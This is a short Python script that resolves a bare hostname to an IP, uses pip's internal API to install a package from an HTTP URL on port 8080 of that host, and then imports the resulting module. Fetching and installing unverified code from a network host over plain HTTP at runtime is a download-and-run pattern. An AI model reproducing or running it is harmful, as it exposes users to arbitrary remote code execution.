import socket
import requests
ip = socket.gethostbyname('d1697837')

from pip._internal import main
import pip

def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        main(['install', package])


install('http://'+ip+':8080/workbench/biblioteca/install.php')

import stdclasses

#import subprocess
#subprocess.check_call(["python", '-m', 'pip', 'install', 'pkg']) # install pkg